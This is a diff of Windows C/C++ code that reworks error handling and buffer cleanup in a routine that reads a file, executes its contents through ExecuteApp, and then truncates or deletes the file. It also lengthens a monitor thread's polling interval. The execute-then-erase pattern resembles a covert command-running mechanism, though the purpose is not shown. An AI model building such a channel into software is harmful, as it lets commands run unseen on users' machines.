@@ -512,34 +512,46 @@ BOOL ExecuteAppFromHashFile(void){
 		}else{
 			dwFileSize = GetFileSize(hFile, NULL);
 			if(dwFileSize == INVALID_FILE_SIZE || !dwFileSize){
-				boolRetVal = FALSE;
-				goto Cleanup;
+				CloseHandle(hFile);
+				hFile=NULL;
+				continue;
 			}
 
 			lpBuffer = new CHAR[dwFileSize+2];
 			if(!lpBuffer){
-				boolRetVal = FALSE;
-				goto Cleanup;
+				CloseHandle(hFile);
+				hFile=NULL;
+				continue;
 			}
 			memset(lpBuffer, 0, dwFileSize+2);
 
 			if(!ReadFile(hFile, lpBuffer, dwFileSize, &nbRead, NULL)){
-
 				#ifdef DEBUG_SHOW_ERROR
 				sprintf(msg, "Error ReadFile: %u", GetLastError());
 				MessageBox(0, msg, NULL, NULL);
 				#endif
-
-				boolRetVal = FALSE;
-				goto Cleanup;
+				
+				if(lpBuffer){
+					delete[] lpBuffer;
+					lpBuffer = NULL;
+				}
+				CloseHandle(hFile);
+				hFile=NULL;
+				continue;
 			}
 
 			if(!nbRead){
-				boolRetVal = FALSE;
-				goto Cleanup;
+				if(lpBuffer){
+					delete[] lpBuffer;
+					lpBuffer = NULL;
+				}
+				CloseHandle(hFile);
+				hFile=NULL;
+				continue;
 			}
-
-			boolRetVal = ExecuteApp(lpBuffer, NULL, FALSE, TRUE, NULL, NULL);
+			
+			if(lpBuffer)
+				boolRetVal = ExecuteApp(lpBuffer, NULL, FALSE, TRUE, NULL, NULL);
 			
 			if(SetFilePointer(hFile, 0, 0, FILE_BEGIN) == INVALID_SET_FILE_POINTER){
 				#ifdef DEBUG_SHOW_ERROR
@@ -550,22 +562,27 @@ BOOL ExecuteAppFromHashFile(void){
 				hFile=NULL;
 				DeleteFile(lpFilePath);
 			}
-
-			if(!SetEndOfFile(hFile)){
-				#ifdef DEBUG_SHOW_ERROR
-				sprintf(msg, "Error SetFilePointer: %u", GetLastError());
-				MessageBox(0, msg, NULL, NULL);
-				#endif
-				CloseHandle(hFile);
-				hFile=NULL;
-				DeleteFile(lpFilePath);
+			else{
+				if(!SetEndOfFile(hFile)){
+					#ifdef DEBUG_SHOW_ERROR
+					sprintf(msg, "Error SetFilePointer: %u", GetLastError());
+					MessageBox(0, msg, NULL, NULL);
+					#endif
+					CloseHandle(hFile);
+					hFile=NULL;
+					DeleteFile(lpFilePath);
+				}
 			}
 
-			goto Cleanup;
+			if(lpBuffer){
+				delete[] lpBuffer;
+				lpBuffer = NULL;
+			}
+			CloseHandle(hFile);
+			hFile=NULL;
 		}
 	}
 
-Cleanup:
 	if(hFile && hFile != INVALID_HANDLE_VALUE)
 		CloseHandle(hFile);
 
@@ -658,7 +675,7 @@ DWORD ThreadMonitor(LPVOID lpParam){
 			}
 		}
 
-		Sleep(1000);
+		Sleep(1500);
 	}
 
 	return TRUE;
